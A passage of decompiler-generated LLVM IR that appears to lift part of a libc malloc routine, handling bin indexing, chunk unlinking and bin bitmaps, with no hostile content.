  %v3_129c0 = inttoptr i32 %v2_129c0 to i32*
  store i32 %v0_129c0, i32* %v3_129c0, align 4
  %v0_129c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_129c4 = load i32, i32* @sb, align 4
  %v2_129c4 = add i32 %v1_129c4, 48
  %v3_129c4 = inttoptr i32 %v2_129c4 to i32*
  store i32 %v0_129c4, i32* %v3_129c4, align 4
  %v0_129c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_129c8 = load i32, i32* %r3.global-to-local, align 4
  %v3_129c8 = add i32 %v1_129c8, %v0_129c8
  %v4_129c8 = inttoptr i32 %v3_129c8 to i32*
  store i32 %v0_129c8, i32* %v4_129c8, align 4
  %v0_129cc = load i32, i32* %r1.global-to-local, align 4
  %v1_129cc = load i32, i32* %r3.global-to-local, align 4
  %v2_129cc = add i32 %v1_129cc, 4
  %v3_129cc = inttoptr i32 %v2_129cc to i32*
  store i32 %v0_129cc, i32* %v3_129cc, align 4
  %v0_129d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_129d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_129d0 = add i32 %v1_129d0, 12
  %v3_129d0 = inttoptr i32 %v2_129d0 to i32*
  store i32 %v0_129d0, i32* %v3_129d0, align 4
  %v0_129d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_129d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_129d4 = add i32 %v1_129d4, 8
  %v3_129d4 = inttoptr i32 %v2_129d4 to i32*
  store i32 %v0_129d4, i32* %v3_129d4, align 4
  br label %dec_label_pc_130fc

dec_label_pc_129dc:                               ; preds = %dec_label_pc_1299c, %dec_label_pc_12990, %dec_label_pc_12988, %dec_label_pc_12974
  %v9_129dc = icmp eq i32 %v1_1297c, %v0_12978
  %v2_129e0 = add i32 %v3_12980, 8
  %v3_129e0 = inttoptr i32 %v2_129e0 to i32*
  store i32 %v0_129e0, i32* %v3_129e0, align 4
  %v0_129e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_129e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_129e4 = add i32 %v1_129e4, 12
  %v3_129e4 = inttoptr i32 %v2_129e4 to i32*
  store i32 %v0_129e4, i32* %v3_129e4, align 4
  br i1 %v9_129dc, label %dec_label_pc_12b3c.loopexit, label %dec_label_pc_129f8

dec_label_pc_129f8:                               ; preds = %dec_label_pc_129dc
  %v0_129f8 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_129f8, 255
  br i1 %tmp205, label %dec_label_pc_12a1c, label %dec_label_pc_12a00

dec_label_pc_12a00:                               ; preds = %dec_label_pc_129f8
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r2.global-to-local, align 4
  %v1_12a04 = load i32, i32* %r8.global-to-local, align 4
  %v2_12a04 = add i32 %v1_12a04, ptrtoint (i32* @global_var_26934.581 to i32)
  %v3_12a04 = inttoptr i32 %v2_12a04 to i32*
  %v4_12a04 = load i32, i32* %v3_12a04, align 4
  %v3_12a08 = udiv i32 %v0_129f8, 8
  store i32 %v3_12a08, i32* %r0.global-to-local, align 4
  %v4_12a0c = mul nuw i32 %v3_12a08, 8
  %v5_12a0c = add i32 %v4_12a04, %v4_12a0c
  store i32 %v5_12a0c, i32* %r3.global-to-local, align 4
  %v1_12a10 = add i32 %v5_12a0c, 44
  store i32 %v1_12a10, i32* %ip.global-to-local, align 4
  %v1_12a14 = add i32 %v5_12a0c, 52
  %v2_12a14 = inttoptr i32 %v1_12a14 to i32*
  %v3_12a14 = load i32, i32* %v2_12a14, align 4
  store i32 %v3_12a14, i32* @lr, align 4
  br label %dec_label_pc_12a74

dec_label_pc_12a1c:                               ; preds = %dec_label_pc_129f8
  store i32 %v0_129f8, i32* %r0.global-to-local, align 4
  %v1_12a20 = call i32 @__malloc_largebin_index(i32 %v0_129f8)
  store i32 %v1_12a20, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %ip.global-to-local, align 4
  %v1_12a28 = load i32, i32* %r8.global-to-local, align 4
  %v2_12a28 = add i32 %v1_12a28, ptrtoint (i32* @global_var_26934.581 to i32)
  %v3_12a28 = inttoptr i32 %v2_12a28 to i32*
  %v4_12a28 = load i32, i32* %v3_12a28, align 4
  %v4_12a2c = mul i32 %v1_12a20, 8
  %v5_12a2c = add i32 %v4_12a28, %v4_12a2c
  store i32 %v5_12a2c, i32* %r3.global-to-local, align 4
  %v1_12a30 = add i32 %v5_12a2c, 44
  store i32 %v1_12a30, i32* %ip.global-to-local, align 4
  %v1_12a34 = add i32 %v5_12a2c, 52
  %v2_12a34 = inttoptr i32 %v1_12a34 to i32*
  %v3_12a34 = load i32, i32* %v2_12a34, align 4
  store i32 %v3_12a34, i32* @lr, align 4
  %v9_12a38 = icmp eq i32 %v3_12a34, %v1_12a30
  br i1 %v9_12a38, label %dec_label_pc_12a74, label %dec_label_pc_12a40

dec_label_pc_12a40:                               ; preds = %dec_label_pc_12a1c
  %v1_12a40 = add i32 %v5_12a2c, 56
  %v2_12a40 = inttoptr i32 %v1_12a40 to i32*
  %v3_12a40 = load i32, i32* %v2_12a40, align 4
  store i32 %v3_12a40, i32* %r1.global-to-local, align 4
  %v1_12a44 = add i32 %v3_12a40, 4
  %v2_12a44 = inttoptr i32 %v1_12a44 to i32*
  %v3_12a44 = load i32, i32* %v2_12a44, align 4
  store i32 %v3_12a44, i32* %r3.global-to-local, align 4
  %v0_12a48 = load i32, i32* %r4.global-to-local, align 4
  %v3_12a48 = icmp ult i32 %v0_12a48, %v3_12a44
  br i1 %v3_12a48, label %.thread, label %dec_label_pc_12a64.preheader

.thread:                                          ; preds = %dec_label_pc_12a40
  store i32 %v1_12a30, i32* @lr, align 4
  store i32 %v3_12a40, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12a74

dec_label_pc_12a64.preheader:                     ; preds = %dec_label_pc_12a40
  %v2_12a50 = or i32 %v0_12a48, 1
  store i32 %v2_12a50, i32* %r2.global-to-local, align 4
  %v1_12a64179 = add i32 %v3_12a34, 4
  %v2_12a64180 = inttoptr i32 %v1_12a64179 to i32*
  %v3_12a64181 = load i32, i32* %v2_12a64180, align 4
  store i32 %v3_12a64181, i32* %r3.global-to-local, align 4
  %v3_12a68183 = icmp ult i32 %v2_12a50, %v3_12a64181
  br i1 %v3_12a68183, label %dec_label_pc_12a60, label %dec_label_pc_12a70

dec_label_pc_12a60:                               ; preds = %dec_label_pc_12a64.preheader, %dec_label_pc_12a60
  %v0_12a70184 = phi i32 [ %v3_12a60, %dec_label_pc_12a60 ], [ %v3_12a34, %dec_label_pc_12a64.preheader ]
  %v1_12a60 = add i32 %v0_12a70184, 8
  %v2_12a60 = inttoptr i32 %v1_12a60 to i32*
  %v3_12a60 = load i32, i32* %v2_12a60, align 4
  store i32 %v3_12a60, i32* @lr, align 4
  %v1_12a64 = add i32 %v3_12a60, 4
  %v2_12a64 = inttoptr i32 %v1_12a64 to i32*
  %v3_12a64 = load i32, i32* %v2_12a64, align 4
  store i32 %v3_12a64, i32* %r3.global-to-local, align 4
  %v3_12a68 = icmp ult i32 %v2_12a50, %v3_12a64
  br i1 %v3_12a68, label %dec_label_pc_12a60, label %dec_label_pc_12a70

dec_label_pc_12a70:                               ; preds = %dec_label_pc_12a60, %dec_label_pc_12a64.preheader
  %v0_12a70.lcssa = phi i32 [ %v3_12a34, %dec_label_pc_12a64.preheader ], [ %v3_12a60, %dec_label_pc_12a60 ]
  %v1_12a70 = add i32 %v0_12a70.lcssa, 12
  %v2_12a70 = inttoptr i32 %v1_12a70 to i32*
  %v3_12a70 = load i32, i32* %v2_12a70, align 4
  store i32 %v3_12a70, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12a74

dec_label_pc_12a74:                               ; preds = %.thread, %dec_label_pc_12a1c, %dec_label_pc_12a00, %dec_label_pc_12a70
  %v0_12a94 = phi i32 [ %v1_12a30, %dec_label_pc_12a1c ], [ %v1_12a10, %dec_label_pc_12a00 ], [ %v3_12a70, %dec_label_pc_12a70 ], [ %v3_12a40, %.thread ]
  %v0_12a88 = phi i32 [ %v1_12a20, %dec_label_pc_12a1c ], [ %v3_12a08, %dec_label_pc_12a00 ], [ %v1_12a20, %dec_label_pc_12a70 ], [ %v1_12a20, %.thread ]
  %v1_12a78 = phi i32 [ %v1_12a28, %dec_label_pc_12a1c ], [ %v1_12a04, %dec_label_pc_12a00 ], [ %v1_12a28, %dec_label_pc_12a70 ], [ %v1_12a28, %.thread ]
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r2.global-to-local, align 4
  %v2_12a78 = add i32 %v1_12a78, ptrtoint (i32* @global_var_26934.581 to i32)
  %v3_12a78 = inttoptr i32 %v2_12a78 to i32*
  %v4_12a78 = load i32, i32* %v3_12a78, align 4
  %v3_12a7c = sdiv i32 %v0_12a88, 32
  store i32 %v3_12a7c, i32* %r3.global-to-local, align 4
  %v4_12a80 = mul nsw i32 %v3_12a7c, 4
  %v5_12a80 = add i32 %v4_12a78, %v4_12a80
  store i32 %v5_12a80, i32* %r1.global-to-local, align 4
  %v1_12a84 = add i32 %v5_12a80, 820
  %v2_12a84 = inttoptr i32 %v1_12a84 to i32*
  %v3_12a84 = load i32, i32* %v2_12a84, align 4
  %v1_12a88 = urem i32 %v0_12a88, 32
  store i32 %v1_12a88, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_12a90 = shl i32 1, %v1_12a88
  %v8_12a90 = or i32 %v3_12a84, %v7_12a90
  store i32 %v8_12a90, i32* %r3.global-to-local, align 4
  %v1_12a94 = load i32, i32* @r6, align 4
  %v2_12a94 = add i32 %v1_12a94, 12
  %v3_12a94 = inttoptr i32 %v2_12a94 to i32*
  store i32 %v0_12a94, i32* %v3_12a94, align 4
  %v0_12a98 = load i32, i32* @lr, align 4
  %v1_12a98 = load i32, i32* @r6, align 4
  %v2_12a98 = add i32 %v1_12a98, 8
  %v3_12a98 = inttoptr i32 %v2_12a98 to i32*
  store i32 %v0_12a98, i32* %v3_12a98, align 4
  %v0_12a9c = load i32, i32* %r3.global-to-local, align 4
  %v1_12a9c = load i32, i32* %r1.global-to-local, align 4
  %v2_12a9c = add i32 %v1_12a9c, 820
  %v3_12a9c = inttoptr i32 %v2_12a9c to i32*
  store i32 %v0_12a9c, i32* %v3_12a9c, align 4
  %v0_12aa0 = load i32, i32* @r6, align 4
  %v1_12aa0 = load i32, i32* @lr, align 4
  %v2_12aa0 = add i32 %v1_12aa0, 12
  %v3_12aa0 = inttoptr i32 %v2_12aa0 to i32*
  store i32 %v0_12aa0, i32* %v3_12aa0, align 4
  %v0_12aa4 = load i32, i32* @r6, align 4
  %v1_12aa4 = load i32, i32* %ip.global-to-local, align 4
  %v2_12aa4 = add i32 %v1_12aa4, 8
  %v3_12aa4 = inttoptr i32 %v2_12aa4 to i32*
  store i32 %v0_12aa4, i32* %v3_12aa4, align 4
  %v0_12ac0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12ac0

dec_label_pc_12aac:                               ; preds = %dec_label_pc_1294c, %dec_label_pc_12904, %dec_label_pc_12960
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r1.global-to-local, align 4
  %v4_12ab4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_12ab4, i32* @sb, align 4
  %v0_12ab8 = load i32, i32* @sl, align 4
  %v1_12ab8 = add i32 %v0_12ab8, 16
  store i32 %v1_12ab8, i32* @fp, align 4
  %v1_12abc = add i32 %v4_12ab4, 52
  store i32 %v1_12abc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12ac0

dec_label_pc_12ac0:                               ; preds = %dec_label_pc_12a74, %dec_label_pc_12aac
  %v0_129e0 = phi i32 [ %v0_12ac0.pre, %dec_label_pc_12a74 ], [ %v1_12abc, %dec_label_pc_12aac ]
  %v1_12ac0 = add i32 %v0_129e0, 12
  %v2_12ac0 = inttoptr i32 %v1_12ac0 to i32*
  %v3_12ac0 = load i32, i32* %v2_12ac0, align 4
  store i32 %v3_12ac0, i32* @r6, align 4
  %v9_12ac4 = icmp eq i32 %v3_12ac0, %v0_129e0
  br i1 %v9_12ac4, label %dec_label_pc_12acc, label %dec_label_pc_12974

dec_label_pc_12acc:                               ; preds = %dec_label_pc_12ac0
  %v0_12acc = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_12acc, 256
  %v0_12b84.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_12acc.dec_label_pc_12b84_crit_edge, label %dec_label_pc_12ad4

dec_label_pc_12acc.dec_label_pc_12b84_crit_edge:  ; preds = %dec_label_pc_12acc
  %.pre200 = mul i32 %v0_12b84.pre, 8
  br label %dec_label_pc_12b84

dec_label_pc_12ad4:                               ; preds = %dec_label_pc_12acc
  %v4_12ad4 = mul i32 %v0_12b84.pre, 8
  %v5_12ad4 = add i32 %v4_12ad4, %v0_129e0
  store i32 %v5_12ad4, i32* %r3.global-to-local, align 4
  %v1_12ad8 = add i32 %v5_12ad4, -8
  store i32 %v1_12ad8, i32* %r1.global-to-local, align 4
  %v1_12adc = add i32 %v5_12ad4, 4
  %v2_12adc = inttoptr i32 %v1_12adc to i32*
  %storemerge.pre = load i32, i32* %v2_12adc, align 4
  br label %dec_label_pc_12b7c

dec_label_pc_12ae4:                               ; preds = %dec_label_pc_12b7c
  %v1_12ae4 = add i32 %v1_12b0c, 4
  %v2_12ae4 = inttoptr i32 %v1_12ae4 to i32*
  %v3_12ae4 = load i32, i32* %v2_12ae4, align 4
  store i32 %v3_12ae4, i32* %r3.global-to-local, align 4
  %v1_12ae8 = and i32 %v3_12ae4, -4
  store i32 %v1_12ae8, i32* %r2.global-to-local, align 4
  %v3_12aec = icmp ult i32 %v1_12ae8, %v0_12acc
  %v1_12af0 = add i32 %v1_12b0c, 12
  %v2_12af0 = inttoptr i32 %v1_12af0 to i32*
  %v3_12af0 = load i32, i32* %v2_12af0, align 4
  store i32 %v3_12af0, i32* %r0.global-to-local, align 4
  br i1 %v3_12aec, label %dec_label_pc_12b7c, label %dec_label_pc_12af8

dec_label_pc_12af8:                               ; preds = %dec_label_pc_12ae4
  %v1_12af8 = add i32 %v1_12b0c, 8
  %v2_12af8 = inttoptr i32 %v1_12af8 to i32*
  %v3_12af8 = load i32, i32* %v2_12af8, align 4
  store i32 %v3_12af8, i32* %r1.global-to-local, align 4
  %v1_12afc = add i32 %v3_12af8, 12
  %v2_12afc = inttoptr i32 %v1_12afc to i32*
  %v3_12afc = load i32, i32* %v2_12afc, align 4
  store i32 %v3_12afc, i32* %r3.global-to-local, align 4
  %v9_12b00 = icmp eq i32 %v3_12afc, %v1_12b0c
  br i1 %v9_12b00, label %dec_label_pc_12b08, label %dec_label_pc_12b14

dec_label_pc_12b08:                               ; preds = %dec_label_pc_12af8
  %v1_12b08 = add i32 %v3_12af0, 8
  %v2_12b08 = inttoptr i32 %v1_12b08 to i32*
  %v3_12b08 = load i32, i32* %v2_12b08, align 4
  store i32 %v3_12b08, i32* %r3.global-to-local, align 4
  %v9_12b0c = icmp eq i32 %v3_12b08, %v1_12b0c
  br i1 %v9_12b0c, label %dec_label_pc_12b18, label %dec_label_pc_12b14

dec_label_pc_12b14:                               ; preds = %dec_label_pc_12af8, %dec_label_pc_12b08
  %v0_12b14 = call i32 @abort()
  store i32 %v0_12b14, i32* %r0.global-to-local, align 4
  %v0_12b18.pre = load i32, i32* @sl, align 4
  %v1_12b18.pre = load i32, i32* @r2, align 4
  %v0_12b20.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12b18

dec_label_pc_12b18:                               ; preds = %dec_label_pc_12b08, %dec_label_pc_12b14
  %v1_12b20 = phi i32 [ %v3_12af0, %dec_label_pc_12b08 ], [ %v0_12b14, %dec_label_pc_12b14 ]
  %v0_12b20 = phi i32 [ %v3_12af8, %dec_label_pc_12b08 ], [ %v0_12b20.pre, %dec_label_pc_12b14 ]
  %v1_12b18 = phi i32 [ %v1_12ae8, %dec_label_pc_12b08 ], [ %v1_12b18.pre, %dec_label_pc_12b14 ]
  %v0_12b18 = phi i32 [ %v0_12acc, %dec_label_pc_12b08 ], [ %v0_12b18.pre, %dec_label_pc_12b14 ]
  %v2_12b18 = sub i32 %v1_12b18, %v0_12b18
  store i32 %v2_12b18, i32* %lr.global-to-local, align 4
  %v2_12b20 = add i32 %v1_12b20, 8
  %v3_12b20 = inttoptr i32 %v2_12b20 to i32*
  store i32 %v0_12b20, i32* %v3_12b20, align 4
  %v0_12b24 = load i32, i32* %r0.global-to-local, align 4
  %v1_12b24 = load i32, i32* %r1.global-to-local, align 4
  %v2_12b24 = add i32 %v1_12b24, 12
  %v3_12b24 = inttoptr i32 %v2_12b24 to i32*
  store i32 %v0_12b24, i32* %v3_12b24, align 4
  %v0_12b28 = load i32, i32* %ip.global-to-local, align 4
  %v1_12b28 = add i32 %v0_12b28, 8
  store i32 %v1_12b28, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_12b18, 15
  br i1 %tmp207, label %dec_label_pc_12b48, label %dec_label_pc_12b30

dec_label_pc_12b30:                               ; preds = %dec_label_pc_12b18
  %v1_12b30 = load i32, i32* %r2.global-to-local, align 4
  %v2_12b30 = add i32 %v1_12b30, %v0_12b28
  store i32 %v2_12b30, i32* %r2.global-to-local, align 4
  %v1_12b34 = add i32 %v2_12b30, 4
  %v2_12b34 = inttoptr i32 %v1_12b34 to i32*
  %v3_12b34 = load i32, i32* %v2_12b34, align 4
  store i32 %v3_12b34, i32* %r3.global-to-local, align 4
  store i32 %v1_12b28, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b3c

dec_label_pc_12b3c.loopexit:                      ; preds = %dec_label_pc_129dc
  %v1_129e8 = load i32, i32* @r6, align 4
  %v2_129e8 = load i32, i32* @sl, align 4
  %v3_129e8 = add i32 %v2_129e8, %v1_129e8
  store i32 %v3_129e8, i32* %r2.global-to-local, align 4
  %v2_129ec = add i32 %v3_129e8, 4
  %v3_129ec = inttoptr i32 %v2_129ec to i32*
  %v4_129ec = load i32, i32* %v3_129ec, align 4
  store i32 %v4_129ec, i32* %r3.global-to-local, align 4
  %v2_129f0 = add i32 %v1_129e8, 8
  store i32 %v2_129f0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b3c

dec_label_pc_12b3c:                               ; preds = %.dec_label_pc_12b3c_crit_edge, %dec_label_pc_12b3c.loopexit, %dec_label_pc_12b30
  %v1_12b40 = phi i32 [ %v4_12c64, %.dec_label_pc_12b3c_crit_edge ], [ %v3_129e8, %dec_label_pc_12b3c.loopexit ], [ %v2_12b30, %dec_label_pc_12b30 ]
  %v0_12b3c = phi i32 [ %v7_12c64, %.dec_label_pc_12b3c_crit_edge ], [ %v4_129ec, %dec_label_pc_12b3c.loopexit ], [ %v3_12b34, %dec_label_pc_12b30 ]
  %v1_12b3c = or i32 %v0_12b3c, 1
  store i32 %v1_12b3c, i32* %r3.global-to-local, align 4
  %v2_12b40 = add i32 %v1_12b40, 4
  %v3_12b40 = inttoptr i32 %v2_12b40 to i32*
  store i32 %v1_12b3c, i32* %v3_12b40, align 4
  br label %dec_label_pc_130fc

dec_label_pc_12b48:                               ; preds = %dec_label_pc_12b18
  %v1_12b48 = load i32, i32* @sl, align 4
  %v2_12b48 = add i32 %v1_12b48, %v0_12b28
  store i32 %v2_12b48, i32* %r2.global-to-local, align 4
  %v1_12b4c = or i32 %v1_12b48, 1
  store i32 %v1_12b4c, i32* %r3.global-to-local, align 4
  %v0_12b50 = load i32, i32* %lr.global-to-local, align 4
  %v1_12b50 = or i32 %v0_12b50, 1
  store i32 %v1_12b50, i32* %r1.global-to-local, align 4
  store i32 %v1_12b28, i32* %r4.global-to-local, align 4
  %v2_12b58 = add i32 %v0_12b28, 4
  %v3_12b58 = inttoptr i32 %v2_12b58 to i32*
  store i32 %v1_12b4c, i32* %v3_12b58, align 4
  %v0_12b5c = load i32, i32* %r2.global-to-local, align 4
  %v1_12b5c = load i32, i32* @r6, align 4
  %v2_12b5c = add i32 %v1_12b5c, 8
  %v3_12b5c = inttoptr i32 %v2_12b5c to i32*
  store i32 %v0_12b5c, i32* %v3_12b5c, align 4
  %v0_12b60 = load i32, i32* %r2.global-to-local, align 4
  %v1_12b60 = load i32, i32* @r6, align 4
  %v2_12b60 = add i32 %v1_12b60, 12
  %v3_12b60 = inttoptr i32 %v2_12b60 to i32*
  store i32 %v0_12b60, i32* %v3_12b60, align 4
  %v0_12b64 = load i32, i32* %lr.global-to-local, align 4
  %v1_12b64 = load i32, i32* %r2.global-to-local, align 4
  %v3_12b64 = add i32 %v1_12b64, %v0_12b64
  %v4_12b64 = inttoptr i32 %v3_12b64 to i32*
  store i32 %v0_12b64, i32* %v4_12b64, align 4
  %v0_12b68 = load i32, i32* %r1.global-to-local, align 4
  %v1_12b68 = load i32, i32* %r2.global-to-local, align 4
  %v2_12b68 = add i32 %v1_12b68, 4
  %v3_12b68 = inttoptr i32 %v2_12b68 to i32*
  store i32 %v0_12b68, i32* %v3_12b68, align 4
  %v0_12b6c = load i32, i32* @r6, align 4
  %v1_12b6c = load i32, i32* %r2.global-to-local, align 4
  %v2_12b6c = add i32 %v1_12b6c, 12
  %v3_12b6c = inttoptr i32 %v2_12b6c to i32*
  store i32 %v0_12b6c, i32* %v3_12b6c, align 4
  %v0_12b70 = load i32, i32* @r6, align 4
  %v1_12b70 = load i32, i32* %r2.global-to-local, align 4
  %v2_12b70 = add i32 %v1_12b70, 8
  %v3_12b70 = inttoptr i32 %v2_12b70 to i32*
  store i32 %v0_12b70, i32* %v3_12b70, align 4
  br label %dec_label_pc_130fc

dec_label_pc_12b7c:                               ; preds = %dec_label_pc_12ae4, %dec_label_pc_12ad4
  %v1_12b0c = phi i32 [ %storemerge.pre, %dec_label_pc_12ad4 ], [ %v3_12af0, %dec_label_pc_12ae4 ]
  store i32 %v1_12b0c, i32* %ip.global-to-local, align 4
  %v9_12b7c = icmp eq i32 %v1_12b0c, %v1_12ad8
  br i1 %v9_12b7c, label %dec_label_pc_12b84.loopexit, label %dec_label_pc_12ae4

dec_label_pc_12b84.loopexit:                      ; preds = %dec_label_pc_12b7c
  br label %dec_label_pc_12b84

dec_label_pc_12b84:                               ; preds = %dec_label_pc_12acc.dec_label_pc_12b84_crit_edge, %dec_label_pc_12b84.loopexit
  %v4_12bb4.pre-phi = phi i32 [ %.pre200, %dec_label_pc_12acc.dec_label_pc_12b84_crit_edge ], [ %v4_12ad4, %dec_label_pc_12b84.loopexit ]
  %v1_12b84 = add i32 %v0_12b84.pre, 1
  store i32 %v1_12b84, i32* %r2.global-to-local, align 4
  %v1_12b88 = urem i32 %v1_12b84, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r0.global-to-local, align 4
  %v6_12b94 = shl i32 1, %v1_12b88
  store i32 %v6_12b94, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12b9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_12b9c, i32* %r3.global-to-local, align 4
  %v3_12ba0 = udiv i32 %v1_12b84, 32
  store i32 %v3_12ba0, i32* @r5, align 4
  %v4_12ba4 = mul nuw nsw i32 %v3_12ba0, 4
  %v5_12ba4 = add i32 %v4_12b9c, %v4_12ba4
  store i32 %v5_12ba4, i32* %r2.global-to-local, align 4
  %v1_12ba8 = add i32 %v5_12ba4, 820
  %v2_12ba8 = inttoptr i32 %v1_12ba8 to i32*
  %v3_12ba8 = load i32, i32* %v2_12ba8, align 4
  store i32 %v3_12ba8, i32* @r4, align 4
  %v1_12bac = add i32 %v4_12b9c, 52
  store i32 %v1_12bac, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_12bb4 = add i32 %v1_12bac, %v4_12bb4.pre-phi
  store i32 %v5_12bb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12bb8

dec_label_pc_12bb8:                               ; preds = %dec_label_pc_12c20, %dec_label_pc_12b84
  %v1_12bc0 = phi i32 [ %v1_12bc0.pre, %dec_label_pc_12c20 ], [ %v3_12ba8, %dec_label_pc_12b84 ]
  %v0_12bc0 = phi i32 [ %v0_12bb8.pre, %dec_label_pc_12c20 ], [ %v6_12b94, %dec_label_pc_12b84 ]
  %v1_12bb8 = sub i32 1, %v0_12bc0
  %v2_12bb8 = icmp ult i32 %v0_12bc0, 2
  %v1_12bb8. = select i1 %v2_12bb8, i32 %v1_12bb8, i32 0
  store i32 %v1_12bb8., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_12bc0, %v1_12bc0
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_12bb8
  %v5_12bc4 = or i32 %v1_12bb8., 1
  store i32 %v5_12bc4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12bd0.preheader

bb142:                                            ; preds = %dec_label_pc_12bb8
  %v2_12bc8 = icmp eq i32 %v1_12bb8., 0
  br i1 %v2_12bc8, label %.dec_label_pc_12c0c.preheader_crit_edge, label %dec_label_pc_12bd0.preheader

.dec_label_pc_12c0c.preheader_crit_edge:          ; preds = %bb142
  %v0_12c0454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c0c.preheader

dec_label_pc_12bd0.preheader:                     ; preds = %bb142, %.thread12
  %v0_12bd0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12bd0

dec_label_pc_12bd0:                               ; preds = %dec_label_pc_12bd0.preheader, %dec_label_pc_12bdc
  %v0_12bd0 = phi i32 [ %v0_12bd0.pre, %dec_label_pc_12bd0.preheader ], [ %v1_12bd0, %dec_label_pc_12bdc ]
  %v1_12bd0 = add i32 %v0_12bd0, 1
  store i32 %v1_12bd0, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_12bd0, 2
  br i1 %tmp208, label %dec_label_pc_12cb0.loopexit, label %dec_label_pc_12bdc

dec_label_pc_12bdc:                               ; preds = %dec_label_pc_12bd0
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r3.global-to-local, align 4
  %v1_12be0 = load i32, i32* @r8, align 4
  %v2_12be0 = add i32 %v1_12be0, ptrtoint (i32* @global_var_26934.581 to i32)
  %v3_12be0 = inttoptr i32 %v2_12be0 to i32*
  %v4_12be0 = load i32, i32* %v3_12be0, align 4
  store i32 %v4_12be0, i32* %r2.global-to-local, align 4
  %v4_12be4 = mul i32 %v1_12bd0, 4
  %v5_12be4 = add i32 %v4_12be0, %v4_12be4
  store i32 %v5_12be4, i32* %r3.global-to-local, align 4
  %v1_12be8 = add i32 %v5_12be4, 820
  %v2_12be8 = inttoptr i32 %v1_12be8 to i32*
  %v3_12be8 = load i32, i32* %v2_12be8, align 4
  store i32 %v3_12be8, i32* @r4, align 4
  %v2_12bec = icmp eq i32 %v3_12be8, 0
  br i1 %v2_12bec, label %dec_label_pc_12bd0, label %dec_label_pc_12bf4

dec_label_pc_12bf4:                               ; preds = %dec_label_pc_12bdc
  %v4_12bf4 = mul i32 %v1_12bd0, 256
  %v5_12bf4 = add i32 %v4_12be0, %v4_12bf4
  store i32 %v5_12bf4, i32* %r3.global-to-local, align 4
  %v1_12bf8 = add i32 %v5_12bf4, 44
  store i32 %v1_12bf8, i32* %r0.global-to-local, align 4
  %v0_12bfc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12bfc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12c0c.preheader

dec_label_pc_12c0c.preheader:                     ; preds = %.dec_label_pc_12c0c.preheader_crit_edge, %dec_label_pc_12bf4
  %v0_12c0454 = phi i32 [ %v1_12bf8, %dec_label_pc_12bf4 ], [ %v0_12c0454.pre, %.dec_label_pc_12c0c.preheader_crit_edge ]
  %v0_12c28 = phi i32 [ %v3_12be8, %dec_label_pc_12bf4 ], [ %v1_12bc0, %.dec_label_pc_12c0c.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_12bfc, %dec_label_pc_12bf4 ], [ %v0_12bc0, %.dec_label_pc_12c0c.preheader_crit_edge ]
  %v2_12c0c51 = and i32 %ip.promoted, %v0_12c28
  %v4_12c0c53 = icmp eq i32 %v2_12c0c51, 0
  br i1 %v4_12c0c53, label %dec_label_pc_12c04, label %dec_label_pc_12c14

dec_label_pc_12c04:                               ; preds = %dec_label_pc_12c0c.preheader, %dec_label_pc_12c04
  %v2_12c0856 = phi i32 [ %v2_12c08, %dec_label_pc_12c04 ], [ %ip.promoted, %dec_label_pc_12c0c.preheader ]
  %v0_12c0455 = phi i32 [ %v1_12c04, %dec_label_pc_12c04 ], [ %v0_12c0454, %dec_label_pc_12c0c.preheader ]
  %v1_12c04 = add i32 %v0_12c0455, 8
  %v2_12c08 = mul i32 %v2_12c0856, 2
  %v2_12c0c = and i32 %v2_12c08, %v0_12c28
  %v4_12c0c = icmp eq i32 %v2_12c0c, 0
  br i1 %v4_12c0c, label %dec_label_pc_12c04, label %dec_label_pc_12c0c.dec_label_pc_12c14_crit_edge

dec_label_pc_12c0c.dec_label_pc_12c14_crit_edge:  ; preds = %dec_label_pc_12c04
  store i32 %v1_12c04, i32* %r0.global-to-local, align 4
  store i32 %v2_12c08, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12c14

